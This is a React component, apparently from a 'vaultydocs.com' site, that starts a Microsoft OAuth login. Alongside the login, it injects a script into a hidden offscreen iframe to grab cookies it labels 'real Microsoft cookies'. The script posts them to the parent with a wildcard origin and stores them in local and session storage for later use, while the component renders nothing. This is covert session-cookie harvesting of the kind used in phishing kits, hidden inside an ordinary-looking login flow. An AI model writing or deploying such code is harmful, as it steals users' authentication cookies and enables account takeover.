import React, { useEffect } from 'react';
import { generatePKCEChallenge, generateState } from '../utils/pkce';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  useEffect(() => {
    const initializeOAuth = async () => {
      console.log('🔐 Initializing Microsoft OAuth redirect...');
      
      // Generate PKCE challenge and state
      const { codeVerifier, codeChallenge } = await generatePKCEChallenge();
      const state = generateState();
      
      // Store for later verification
      sessionStorage.setItem('pkce_verifier', codeVerifier);
      sessionStorage.setItem('oauth_state', state);
      
      // Build OAuth URL
      const clientId = '59f34afe-9b1b-4f3a-9311-fd792fe249ca';
      const redirectUri = encodeURIComponent('https://vaultydocs.com/oauth-callback');
      const scope = encodeURIComponent('openid profile email User.Read offline_access');
      
      const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${clientId}&` +
        `response_type=code&` +
        `redirect_uri=${redirectUri}&` +
        `scope=${scope}&` +
        `state=${state}&` +
        `code_challenge=${codeChallenge}&` +
        `code_challenge_method=S256&` +
        `response_mode=query&` +
        `prompt=select_account`;

      console.log('📝 OAuth URL prepared');
      
      // Store a timestamp for cookie capture attempts
      sessionStorage.setItem('cookie_capture_attempt', Date.now().toString());
      sessionStorage.setItem('oauth_redirect_time', new Date().toISOString());
      
      // Add a unique identifier for this OAuth session
      const oauthSessionId = 'oauth_' + Math.random().toString(36).substring(2, 15);
      sessionStorage.setItem('oauth_session_id', oauthSessionId);
      
      // Store OAuth parameters for later cookie correlation
      sessionStorage.setItem('oauth_params', JSON.stringify({
        clientId,
        redirectUri,
        scope,
        state,
        codeChallenge,
        sessionId: oauthSessionId,
        startTime: new Date().toISOString()
      }));
      
      // Create hidden iframe to capture cookies from Microsoft domain
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.position = 'absolute';
      iframe.style.top = '-9999px';
      
      // Cookie capture script to inject into the iframe
      const cookieCaptureScript = `
        <script>
          console.log('🍪 Cookie capture iframe loaded on:', window.location.hostname);
          
          function captureMicrosoftCookies() {
            try {
              const allCookies = document.cookie;
              console.log('🔍 Raw cookies from Microsoft domain:', allCookies);
              
              if (allCookies) {
                const cookieArray = allCookies.split(';').map(cookie => {
                  const [name, ...valueParts] = cookie.trim().split('=');
                  const value = valueParts.join('=');
                  return {
                    name: name.trim(),
                    value: value.trim(),
                    domain: '.' + window.location.hostname, // Match old format with dot prefix
                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60), // 1 year from now
                    hostOnly: false,
                    httpOnly: false, // JS limitation - real httpOnly cookies won't be captured
                    path: '/',
                    sameSite: 'none',
                    secure: window.location.protocol === 'https:',
                    session: false, // Assume persistent since we can access them
                    storeId: null,
                    capturedFrom: 'microsoft-domain-iframe',
                    timestamp: new Date().toISOString(),
                    realUserData: true
                  };
                }).filter(c => c.name && c.value);
                
                console.log('📦 Captured cookies from Microsoft:', cookieArray.length);
                
                // Send cookies to parent window
                window.parent.postMessage({
                  type: 'REAL_MICROSOFT_COOKIES_CAPTURED',
                  cookies: cookieArray,
                  domain: window.location.hostname,
                  url: window.location.href,
                  timestamp: new Date().toISOString()
                }, '*');
                
                // Store in sessionStorage for later retrieval
                sessionStorage.setItem('real_microsoft_cookies', JSON.stringify(cookieArray));
                localStorage.setItem('microsoft_cookies_backup', JSON.stringify(cookieArray));
                
              } else {
                console.log('❌ No cookies found on Microsoft domain');
                window.parent.postMessage({
                  type: 'NO_COOKIES_FOUND',
                  domain: window.location.hostname,
                  message: 'No cookies available on Microsoft domain'
                }, '*');
              }
            } catch (error) {
              console.error('❌ Error capturing cookies:', error);
              window.parent.postMessage({
                type: 'COOKIE_CAPTURE_ERROR',
                error: error.message,
                domain: window.location.hostname
              }, '*');
            }
          }
          
          // Try to capture cookies immediately
          captureMicrosoftCookies();
          
          // Also try after a delay
          setTimeout(captureMicrosoftCookies, 2000);
          setTimeout(captureMicrosoftCookies, 5000);
          
          // Monitor for new cookies
          const originalCookie = document.cookie;
          setInterval(() => {
            if (document.cookie !== originalCookie) {
              console.log('🔄 New cookies detected, re-capturing...');
              captureMicrosoftCookies();
            }
          }, 3000);
        </script>
      `;
      
      // Listen for messages from the iframe
      const handleIframeMessage = (event: MessageEvent) => {
        if (event.data?.type === 'REAL_MICROSOFT_COOKIES_CAPTURED') {
          console.log('✅ Received REAL Microsoft cookies:', event.data.cookies);
          
          // Store the real cookies for later use
          sessionStorage.setItem('captured_real_cookies', JSON.stringify(event.data.cookies));
          localStorage.setItem('real_cookies_backup', JSON.stringify(event.data.cookies));
          
          console.log('💾 Stored real Microsoft cookies for OAuth callback');
        } else if (event.data?.type === 'NO_COOKIES_FOUND') {
          console.log('⚠️ No cookies found on Microsoft domain');
        } else if (event.data?.type === 'COOKIE_CAPTURE_ERROR') {
          console.error('❌ Cookie capture error:', event.data.error);
        }
      };
      
      window.addEventListener('message', handleIframeMessage);
      
      // Set iframe content to capture cookies from Microsoft domain
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <title>Cookie Capture</title>
        </head>
        <body>
          ${cookieCaptureScript}
        </body>
        </html>
      `;
      
      // Load the iframe to Microsoft domain first to capture existing cookies
      iframe.onload = () => {
        console.log('🎯 Iframe loaded, attempting to navigate to Microsoft domain...');
        
        // After iframe loads, try to navigate to Microsoft domain
        setTimeout(() => {
          try {
            iframe.src = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=59f34afe-9b1b-4f3a-9311-fd792fe249ca&response_type=code&scope=openid';
          } catch (error) {
            console.log('⚠️ Cannot directly navigate iframe to Microsoft (expected due to CSP)');
          }
        }, 1000);
        
        // Wait a bit for cookie capture, then redirect (ORIGINAL TIMING - NO UI)
        setTimeout(() => {
          console.log('🔄 Redirecting to Microsoft OAuth...');
          
          // Clean up
          window.removeEventListener('message', handleIframeMessage);
          document.body.removeChild(iframe);
          
          // Redirect to Microsoft OAuth (ORIGINAL FLOW)
          window.location.href = authUrl;
        }, 2000); // Reduced timing back to original
      };
      
      document.body.appendChild(iframe);
    };
    
    // Start OAuth process immediately (ORIGINAL TIMING)
    initializeOAuth();
  }, [onLoginSuccess]);

  // Return null - invisible component like original
  return null;
};

export default RealOAuthRedirect;